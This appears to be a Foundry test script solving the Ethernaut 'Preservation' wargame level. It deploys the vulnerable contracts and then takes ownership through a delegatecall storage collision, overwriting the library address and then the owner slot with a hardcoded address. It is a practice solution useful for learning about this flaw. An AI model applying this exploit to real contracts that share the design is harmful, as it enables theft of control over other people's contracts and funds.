// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {LibraryContract, Preservation} from "../instances/Ilevel16.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        LibraryContract libraryContract = new LibraryContract();
        Preservation preservation = new Preservation(
            address(libraryContract),
            address(libraryContract)
        );

        DelegateHack delegateHack = new DelegateHack(address(preservation));
        console.log("Owner before exploit: %s", preservation.owner());
        delegateHack.exploit();
        console.log("Owner after exploit: %s", preservation.owner());

        vm.stopBroadcast();
    }
}

contract DelegateHack {
    address public t1;
    address public t2;
    address public owner;

    Preservation preservation;

    constructor(address _preservation) {
        preservation = Preservation(_preservation);
    }

    function exploit() external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(
            uint256(uint160(0xFeebabE6b0418eC13b30aAdF129F5DcDd4f70CeA))
        );
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
